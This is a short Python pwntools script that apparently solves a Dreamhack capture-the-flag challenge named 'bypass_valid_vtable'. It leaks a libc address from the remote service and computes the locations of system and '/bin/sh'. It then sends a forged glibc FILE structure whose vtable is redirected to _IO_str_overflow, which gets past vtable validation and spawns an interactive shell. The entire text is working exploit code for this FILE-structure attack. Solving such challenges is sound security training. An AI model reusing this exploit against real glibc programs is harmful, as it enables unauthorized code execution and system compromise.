from pwn import *
p = remote("host3.dreamhack.games", 19387)
e = ELF('./bypass_valid_vtable')
libc = ELF('./libc.so.6')

stdout = int(b'0x' + p.recvuntil(b'\n')[-13:-1],16)
base = stdout - libc.symbols['_IO_2_1_stdout_']
system = base + libc.symbols['system']
binsh = base + next(libc.search(b'/bin/sh'))
lock = e.bss() + 0x80

io_file_jumps = base + libc.symbols['_IO_file_jumps']
str_overflow = io_file_jumps + 0xd8

pay = b''
pay += p64(0) #flags
pay += p64(0) #read ptr
pay += p64(0) #read end
pay += p64(0) #read base
pay += p64(0) #write base
pay += p64(int((binsh - 100)/2 + 1)) #write ptr
pay += p64(0) #write end
pay += p64(0) #buf base
pay += p64(int((binsh - 100)/2)) #buf end
pay += p64(0) #save base
pay += p64(0) #backup base
pay += p64(0) #save end
pay += p64(0) #markers
pay += p64(0) #chain
pay += p64(0) #fileno & flags
pay += p64(0) #old offset
pay += p64(0) #cur column, vtable offset, shortbuf
pay += p64(lock) #lock
pay += p64(0) #offset
pay += p64(0) #codecvt
pay += p64(0) #wide data
pay += p64(0) #freeres list
pay += p64(0) #freeres buf
pay += p64(0) #pad5
pay += p64(0) #mod, unused2
pay += p64(0) #unused2
pay += p64(0) #unused2
pay += p64(str_overflow - 0x10) #vtable
pay += p64(system) #vtable dummy1

p.sendlineafter(b'Data: ',pay)
p.sendline(b'id')

p.interactive()
